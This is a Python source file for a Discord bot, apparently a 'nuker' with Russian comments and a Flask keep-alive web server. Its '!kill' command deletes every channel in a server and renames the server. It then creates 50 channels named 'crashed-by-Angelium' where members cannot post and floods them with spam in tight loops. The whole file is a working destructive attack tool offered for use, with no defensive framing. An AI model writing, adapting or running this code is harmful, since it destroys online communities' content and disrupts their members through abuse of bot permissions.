import discord
from discord.ext import commands
import asyncio
import os
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Бот Flood Community жив!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN")  # !!! ВАЖНО: токен из переменных окружения, НЕ в коде
NEW_NAME = "crash by 50cent"

def load_spam_text():
    if os.path.exists("spam.txt"):
        with open("spam.txt", "r", encoding="utf-8") as f:
            return f.read().strip()
    return "SPAM"

spam_text = load_spam_text()
spamming = False
created_channel_ids = []

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

async def spam_channel(channel):
    global spamming
    while spamming:
        try:
            await channel.send(spam_text)
            await asyncio.sleep(0.05)
        except:
            await asyncio.sleep(0.1)

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command()
async def kill(ctx):
    global spamming, created_channel_ids

    await ctx.message.delete()
    guild = ctx.guild

    await delete_all_channels(guild)

    try:
        await guild.edit(name=NEW_NAME)
    except:
        pass

    created_channel_ids.clear()
    spamming = True

    everyone_role = guild.default_role
    overwrites = {
        everyone_role: discord.PermissionOverwrite(
            view_channel=True,
            read_messages=True,
            send_messages=False
        )
    }

    channels = []
    for i in range(50):
        try:
            ch = await guild.create_text_channel(name="crashed-by-Angelium", overwrites=overwrites)
            channels.append(ch)
        except:
            await asyncio.sleep(0.2)

    for channel in channels:
        created_channel_ids.append(channel.id)
        asyncio.create_task(spam_channel(channel))

keep_alive()
bot.run(TOKEN)